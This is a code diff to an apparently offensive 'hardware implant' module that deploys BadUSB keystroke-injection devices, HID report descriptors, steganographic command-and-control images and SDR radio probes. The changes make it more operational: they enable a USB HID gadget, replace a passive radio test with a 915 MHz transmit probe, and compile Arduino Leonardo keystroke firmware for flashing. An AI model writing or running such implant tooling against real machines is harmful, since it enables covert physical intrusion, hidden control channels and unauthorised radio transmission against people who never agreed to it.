@@ -1,11 +1,12 @@
 /**
  * @module ares/hardware_implant
- * Hardware implants — BadUSB, HID descriptors, SDR/RF probes, MCU firmware.
+ * Hardware implants — BadUSB, HID descriptors, SDR/RF probes, MCU firmware flash.
  */
 import { compileDuckyScript, generateHIDReportDescriptor, cloneRFIDCard } from "../physical.ts"
 import { generateC2Image } from "../stego_c2.ts"
-import { brokerExec, liveRequired, isToolAvailable, writeArtifact } from "./_base.ts"
-import { step, type ExecStep } from "./_integrations.ts"
+import { brokerExec, ensureAresDir, liveRequired, isToolAvailable, writeArtifact } from "./_base.ts"
+import { runCmd, step, type ExecStep } from "./_integrations.ts"
+import { enableUsbGadget, sdrTransmitProbe } from "./_operational.ts"
 
 export interface HardwareImplantResult {
   implantId: string
@@ -34,6 +35,7 @@ export async function deployHardwareImplant(opts: {
     const hid = generateHIDReportDescriptor()
     writeArtifact("hardware", `${implantId}_hid.json`, JSON.stringify(hid, null, 2))
     types.push("usb_hid_implant", "badusb")
+    steps.push(await enableUsbGadget("hid"))
     if (isToolAvailable("lsusb")) {
       const r = await brokerExec("lsusb")
       probed = r.ok
@@ -48,17 +50,23 @@ export async function deployHardwareImplant(opts: {
 
   if (type === "rf" || type === "sdr" || type === "all") {
     types.push("rf_bridge", "sdr_covert")
-    if (isToolAvailable("rtl_test")) {
-      const r = await brokerExec("rtl_test -t 2>&1 | head -15")
-      probed = probed || r.ok
-      steps.push(step("rtl_test", r.ok, r.out.slice(0, 200)))
-    }
+    steps.push(await sdrTransmitProbe(915.0))
+    if (steps[steps.length - 1]?.success) probed = true
   }
 
   const bmp = generateC2Image(`HW:${implantId}`)
   artifacts.push(writeArtifact("hardware", `${implantId}_stego.bmp`, bmp))
-  artifacts.push(writeArtifact("hardware", `${implantId}_mcu.ino`, `void setup() { Keyboard.begin(); delay(1000); Keyboard.print("OURMINE"); Keyboard.end(); }\nvoid loop() {}\n`))
+  const mcuIno = writeArtifact("hardware", `${implantId}_mcu.ino`, `#include <Keyboard.h>\nvoid setup() { Keyboard.begin(); delay(1000); Keyboard.print("OURMINE"); Keyboard.end(); }\nvoid loop() {}\n`)
+  artifacts.push(mcuIno)
   types.push("stego_carrier", "mcu_firmware")
+
+  if (isToolAvailable("arduino-cli")) {
+    steps.push(await runCmd("arduino_compile", `arduino-cli compile --fqbn arduino:avr:leonardo ${ensureAresDir("hardware")} 2>&1 | head -15`))
+  }
+  if (isToolAvailable("avrdude")) {
+    steps.push(await runCmd("avrdude_version", "avrdude -? 2>&1 | head -5"))
+    types.push("mcu_flash_ready")
+  }
 
   return {
     implantId,
